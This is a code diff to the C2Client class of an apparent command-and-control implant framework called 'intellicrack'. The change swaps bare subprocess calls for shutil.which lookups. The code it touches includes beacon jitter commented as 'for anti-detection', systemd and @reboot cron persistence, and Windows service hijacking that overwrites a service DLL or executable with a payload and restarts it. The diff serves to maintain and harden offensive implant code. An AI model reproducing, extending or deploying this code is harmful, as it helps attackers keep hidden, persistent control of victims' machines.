@@ -22,12 +22,13 @@ import os
 import platform
 import queue
 import random
+import shutil
 import sys
 import time
 from typing import Any
 
 from intellicrack.handlers.psutil_handler import psutil
-from intellicrack.utils.service_health_checker import get_service_url
+from intellicrack.utils.service_utils import get_service_url
 
 from .base_c2 import BaseC2
 
@@ -602,7 +603,7 @@ class C2Client(BaseC2):
 
     async def _calculate_beacon_time(self) -> float:
         """Calculate next beacon time with jitter."""
-        jitter = random.uniform(-self.jitter_percent / 100, self.jitter_percent / 100)
+        jitter = random.uniform(-self.jitter_percent / 100, self.jitter_percent / 100)  # noqa: S311 - Timing jitter for anti-detection
         beacon_time = self.beacon_interval * (1 + jitter)
         return max(beacon_time, 5)  # Minimum 5 seconds
 
@@ -1261,20 +1262,31 @@ class C2Client(BaseC2):
 
             try:
                 if os.name == "nt":
-                    result = subprocess.run(
-                        ["tasklist"],
-                        check=False,
-                        capture_output=True,
-                        text=True,  # noqa: S607
-                    )
+                    tasklist_path = shutil.which("tasklist")
+                    if tasklist_path:
+                        result = subprocess.run(
+                            [tasklist_path],
+                            check=False,
+                            capture_output=True,
+                            text=True,
+                            shell=False  # Explicitly secure - using list format prevents shell injection
+                        )
+                        return {"raw_output": result.stdout if result and result.stdout else ""}
+                    else:
+                        return {"raw_output": "tasklist command not found"}
                 else:
-                    result = subprocess.run(
-                        ["ps", "aux"],
-                        check=False,
-                        capture_output=True,
-                        text=True,  # noqa: S607
-                    )
-                return {"raw_output": result.stdout}
+                    ps_path = shutil.which("ps")
+                    if ps_path:
+                        result = subprocess.run(
+                            [ps_path, "aux"],
+                            check=False,
+                            capture_output=True,
+                            text=True,
+                            shell=False  # Explicitly secure - using list format prevents shell injection
+                        )
+                        return {"raw_output": result.stdout if result and result.stdout else ""}
+                    else:
+                        return {"raw_output": "ps command not found"}
             except (
                 OSError,
                 ConnectionError,
@@ -1579,11 +1591,14 @@ WantedBy=multi-user.target
                             f.write(service_content)
 
                         # Enable and start service
-                        subprocess.run(["systemctl", "daemon-reload"], check=True)  # nosec S607 - Legitimate subprocess usage for security research and binary analysis  # noqa: S607
-                        subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
-                            ["systemctl", "enable", f"{service_name.lower()}.service"],
-                            check=True,  # noqa: S607
-                        )
+                        systemctl_path = shutil.which("systemctl")
+                        if systemctl_path:
+                            subprocess.run([systemctl_path, "daemon-reload"], check=True, shell=False)
+                            subprocess.run(
+                                [systemctl_path, "enable", f"{service_name.lower()}.service"],
+                                check=True,
+                                shell=False  # Explicitly secure - using list format prevents shell injection
+                            )
 
                         results["success"] = True
                         results["message"] = f"systemd persistence installed: {service_name}"
@@ -1614,17 +1629,19 @@ WantedBy=multi-user.target
                         cron_entry = f"@reboot {executable_path}"
 
                         # Add to user's crontab
-                        result = subprocess.run(
-                            ["crontab", "-l"],
-                            check=False,
-                            capture_output=True,
-                            text=True,  # noqa: S607
-                        )
-                        existing_cron = result.stdout if result.returncode == 0 else ""
+                        crontab_path = shutil.which("crontab")
+                        if crontab_path:
+                            result = subprocess.run(
+                                [crontab_path, "-l"],
+                                check=False,
+                                capture_output=True,
+                                text=True,
+                            )
+                            existing_cron = result.stdout if result.returncode == 0 else ""
 
-                        if cron_entry not in existing_cron:
-                            new_cron = existing_cron + f"\n{cron_entry}\n"
-                            subprocess.run(["crontab", "-"], input=new_cron, text=True, check=True)  # nosec S607 - Legitimate subprocess usage for security research and binary analysis  # noqa: S607
+                            if cron_entry not in existing_cron:
+                                new_cron = existing_cron + f"\n{cron_entry}\n"
+                                subprocess.run([crontab_path, "-"], input=new_cron, text=True, check=True)
 
                         results["success"] = True
                         results["message"] = "Cron persistence installed: @reboot"
@@ -2930,12 +2947,14 @@ WantedBy=multi-user.target
 
             if result.returncode == 0:
                 # Try to start service to execute payload
-                subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
-                    ["sc", "start", service_name],
-                    check=False,
-                    capture_output=True,
-                    text=True,  # noqa: S607
-                )
+                sc_path = shutil.which("sc")
+                if sc_path:
+                    subprocess.run(
+                        [sc_path, "start", service_name],
+                        check=False,
+                        capture_output=True,
+                        text=True,
+                    )
 
                 return {
                     "success": True,
@@ -2997,16 +3016,18 @@ WantedBy=multi-user.target
                                 shutil.copy2(temp_dll.name, dll_path)
 
                                 # Restart service
-                                subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
-                                    ["sc", "stop", service_name],
-                                    check=False,
-                                    capture_output=True,  # noqa: S607
-                                )
-                                subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
-                                    ["sc", "start", service_name],
-                                    check=False,
-                                    capture_output=True,  # noqa: S607
-                                )
+                                sc_path = shutil.which("sc")
+                                if sc_path:
+                                    subprocess.run(
+                                        [sc_path, "stop", service_name],
+                                        check=False,
+                                        capture_output=True,
+                                    )
+                                    subprocess.run(
+                                        [sc_path, "start", service_name],
+                                        check=False,
+                                        capture_output=True,
+                                    )
 
                                 return {
                                     "success": True,
@@ -3067,21 +3088,29 @@ WantedBy=multi-user.target
                                 shutil.copy2(temp_exe.name, binary_path)
 
                                 # Restart service
-                                stop_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
-                                    ["sc", "stop", service_name],
-                                    check=False,
-                                    capture_output=True,  # noqa: S607
-                                )
-                                start_result = subprocess.run(  # nosec S603 - Legitimate subprocess usage for security research and binary analysis  # noqa: S603
-                                    ["sc", "start", service_name],  # noqa: S607
-                                    check=False,
-                                    capture_output=True,
-                                    text=True,
-                                )
+                                sc_path = shutil.which("sc")
+                                if sc_path:
+                                    stop_result = subprocess.run(
+                                        [sc_path, "stop", service_name],
+                                        check=False,
+                                        capture_output=True,
+                                    )
+                                    start_result = subprocess.run(
+                                        [sc_path, "start", service_name],
+                                        check=False,
+                                        capture_output=True,
+                                        text=True,
+                                    )
+                                else:
+                                    stop_result = None
+                                    start_result = None
 
-                                self.logger.debug(
-                                    f"Service restart: stop={stop_result.returncode}, start={start_result.returncode}"
-                                )
+                                if stop_result and start_result:
+                                    self.logger.debug(
+                                        f"Service restart: stop={stop_result.returncode}, start={start_result.returncode}"
+                                    )
+                                else:
+                                    self.logger.debug("Service restart failed: sc command not found")
 
                                 return {
                                     "success": True,
